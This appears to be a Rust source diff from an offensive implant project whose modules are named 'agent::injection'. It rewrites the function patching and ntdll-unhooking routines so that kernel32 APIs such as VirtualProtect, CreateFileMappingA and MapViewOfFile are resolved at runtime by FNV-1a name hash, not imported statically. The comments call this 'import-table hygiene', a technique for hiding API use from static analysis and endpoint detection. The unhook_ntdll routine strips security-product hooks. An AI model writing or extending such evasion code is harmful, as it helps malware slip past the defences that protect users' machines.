@@ -52,10 +52,35 @@ unsafe fn patch_function(dll: &str, func: &str, patch: &[u8]) -> Result<String, 
     use std::ffi::CString;
     use std::ptr;
 
-    extern "system" {
-        fn LoadLibraryA(name: *const i8) -> *mut std::ffi::c_void;
-        fn GetProcAddress(module: *mut std::ffi::c_void, name: *const i8) -> *mut std::ffi::c_void;
-        fn VirtualProtect(addr: *mut std::ffi::c_void, size: usize, new: u32, old: *mut u32) -> i32;
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn LoadLibraryA(name: *const i8) -> *mut std::ffi::c_void {
+        type F = unsafe extern "system" fn(*const i8) -> *mut std::ffi::c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"LoadLibraryA")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(name) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GetProcAddress(module: *mut std::ffi::c_void, name: *const i8) -> *mut std::ffi::c_void {
+        type F = unsafe extern "system" fn(*mut std::ffi::c_void, *const i8) -> *mut std::ffi::c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetProcAddress")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(module, name) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn VirtualProtect(addr: *mut std::ffi::c_void, size: usize, new: u32, old: *mut u32) -> i32 {
+        type F = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, *mut u32) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualProtect")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(addr, size, new, old) }
     }
     let page_execute_readwrite = crate::config::config().ffi_windows.page_execute_readwrite;
 
@@ -98,16 +123,75 @@ pub fn unhook_ntdll() -> Result<String, String> {
     use std::mem;
     use std::ptr;
 
-    extern "system" {
-        fn GetModuleHandleA(name: *const i8) -> *mut c_void;
-        fn CreateFileA(name: *const i8, access: u32, share: u32, sa: *mut c_void,
-                       disp: u32, flags: u32, template: *mut c_void) -> *mut c_void;
-        fn CreateFileMappingA(file: *mut c_void, sa: *mut c_void, protect: u32,
-                              hi: u32, lo: u32, name: *const i8) -> *mut c_void;
-        fn MapViewOfFile(mapping: *mut c_void, access: u32, hi: u32, lo: u32, bytes: usize) -> *mut c_void;
-        fn UnmapViewOfFile(addr: *const c_void) -> i32;
-        fn VirtualProtect(addr: *mut c_void, size: usize, new: u32, old: *mut u32) -> i32;
-        fn CloseHandle(h: *mut c_void) -> i32;
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GetModuleHandleA(name: *const i8) -> *mut c_void {
+        type F = unsafe extern "system" fn(*const i8) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetModuleHandleA")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(name) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn CreateFileA(name: *const i8, access: u32, share: u32, sa: *mut c_void, disp: u32, flags: u32, template: *mut c_void) -> *mut c_void {
+        type F = unsafe extern "system" fn(*const i8, u32, u32, *mut c_void, u32, u32, *mut c_void) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateFileA")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(name, access, share, sa, disp, flags, template) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn CreateFileMappingA(file: *mut c_void, sa: *mut c_void, protect: u32, hi: u32, lo: u32, name: *const i8) -> *mut c_void {
+        type F = unsafe extern "system" fn(*mut c_void, *mut c_void, u32, u32, u32, *const i8) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateFileMappingA")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(file, sa, protect, hi, lo, name) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn MapViewOfFile(mapping: *mut c_void, access: u32, hi: u32, lo: u32, bytes: usize) -> *mut c_void {
+        type F = unsafe extern "system" fn(*mut c_void, u32, u32, u32, usize) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"MapViewOfFile")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(mapping, access, hi, lo, bytes) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn UnmapViewOfFile(addr: *const c_void) -> i32 {
+        type F = unsafe extern "system" fn(*const c_void) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"UnmapViewOfFile")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(addr) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn VirtualProtect(addr: *mut c_void, size: usize, new: u32, old: *mut u32) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualProtect")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(addr, size, new, old) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn CloseHandle(h: *mut c_void) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CloseHandle")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(h) }
     }
 
     // OS-fixed (winnt.h) values with no typed-config mirror stay const.
